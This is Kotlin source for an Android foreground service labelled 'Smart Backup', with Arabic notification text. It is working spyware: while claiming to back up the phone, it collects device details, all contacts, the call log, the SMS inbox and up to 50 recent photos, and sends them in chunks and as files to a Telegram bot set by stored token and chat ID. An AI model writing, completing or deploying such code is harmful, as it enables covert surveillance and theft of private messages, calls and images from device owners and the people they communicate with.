package com.sync.backup

import android.app.*
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.CallLog
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

class UploadService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()
    private lateinit var token: String
    private lateinit var chat: String
    private val sent = mutableSetOf<String>()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, buildNotif("جارٍ النسخ الاحتياطي..."))
        val p = getSharedPreferences("cfg", MODE_PRIVATE)
        token = p.getString("token", "") ?: ""
        chat = p.getString("chat", "") ?: ""
        scope.launch {
            try {
                sendDeviceInfo()
                sendContacts()
                sendCallLog()
                sendSms()
                sendImages()
                updateNotif("اكتمل النسخ الاحتياطي")
            } catch (e: Exception) {
                updateNotif("خطأ: ${e.message}")
            }
            delay(2000)
            stopSelf()
        }
        return START_NOT_STICKY
    }

    private fun buildNotif(text: String): Notification {
        val ch = "svc"
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(NotificationChannel(ch, "Backup", NotificationManager.IMPORTANCE_LOW))
        }
        return NotificationCompat.Builder(this, ch)
            .setContentTitle("Smart Backup")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setOngoing(true)
            .build()
    }

    private fun updateNotif(text: String) {
        val nm = getSystemService(NotificationManager::class.java)
        nm.notify(1, buildNotif(text))
    }

    private fun sendMsg(text: String) {
        val body = FormBody.Builder()
            .add("chat_id", chat)
            .add("text", text)
            .build()
        val req = Request.Builder()
            .url("https://api.telegram.org/bot$token/sendMessage")
            .post(body).build()
        client.newCall(req).execute().close()
    }

    private fun sendFile(file: File, caption: String) {
        if (!file.exists()) return
        val key = file.absolutePath + "_" + file.length()
        if (!sent.add(key)) return
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chat)
            .addFormDataPart("caption", caption)
            .addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaType()))
            .build()
        val req = Request.Builder()
            .url("https://api.telegram.org/bot$token/sendDocument")
            .post(body).build()
        try { client.newCall(req).execute().close() } catch (_: Exception) {}
    }

    private fun sendDeviceInfo() {
        val sb = StringBuilder()
        sb.appendLine("📱 جهاز جديد متصل")
        sb.appendLine("Model: ${Build.MODEL}")
        sb.appendLine("Brand: ${Build.BRAND}")
        sb.appendLine("Android: ${Build.VERSION.RELEASE}")
        sb.appendLine("SDK: ${Build.VERSION.SDK_INT}")
        sendMsg(sb.toString())
    }

    private fun sendContacts() {
        val sb = StringBuilder("📇 جهات الاتصال:\n")
        val cur: Cursor? = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
        cur?.use {
            val nameI = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numI = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (it.moveToNext()) {
                sb.appendLine("${it.getString(nameI)} : ${it.getString(numI)}")
            }
        }
        sendChunked(sb.toString())
    }

    private fun sendCallLog() {
        val sb = StringBuilder("📞 سجل المكالمات:\n")
        val cur = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null,
            CallLog.Calls.DATE + " DESC")
        cur?.use {
            val numI = it.getColumnIndex(CallLog.Calls.NUMBER)
            val typeI = it.getColumnIndex(CallLog.Calls.TYPE)
            val dateI = it.getColumnIndex(CallLog.Calls.DATE)
            val durI = it.getColumnIndex(CallLog.Calls.DURATION)
            while (it.moveToNext()) {
                sb.appendLine("${it.getString(numI)} | type=${it.getInt(typeI)} | dur=${it.getInt(durI)} | ${it.getLong(dateI)}")
            }
        }
        sendChunked(sb.toString())
    }

    private fun sendSms() {
        val sb = StringBuilder("💬 الرسائل:\n")
        val cur = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
        cur?.use {
            val addrI = it.getColumnIndex("address")
            val bodyI = it.getColumnIndex("body")
            val dateI = it.getColumnIndex("date")
            while (it.moveToNext()) {
                sb.appendLine("From: ${it.getString(addrI)} | ${it.getLong(dateI)}")
                sb.appendLine(it.getString(bodyI))
                sb.appendLine("---")
            }
        }
        sendChunked(sb.toString())
    }

    private fun sendImages() {
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val cur = contentResolver.query(uri, null, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC")
        cur?.use {
            val idI = it.getColumnIndex(MediaStore.Images.Media._ID)
            val nameI = it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
            var count = 0
            while (it.moveToNext() && count < 50) {
                val id = it.getLong(idI)
                val name = it.getString(nameI) ?: "img.jpg"
                val fileUri = Uri.withAppendedPath(uri, id.toString())
                try {
                    val tmp = File(cacheDir, name)
                    contentResolver.openInputStream(fileUri)?.use { inp ->
                        tmp.outputStream().use { out -> inp.copyTo(out) }
                    }
                    sendFile(tmp, "📷 $name")
                    tmp.delete()
                    count++
                } catch (_: Exception) {}
            }
        }
    }

    private fun sendChunked(text: String) {
        val limit = 4000
        var i = 0
        while (i < text.length) {
            val end = minOf(i + limit, text.length)
            sendMsg(text.substring(i, end))
            i = end
        }
    }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}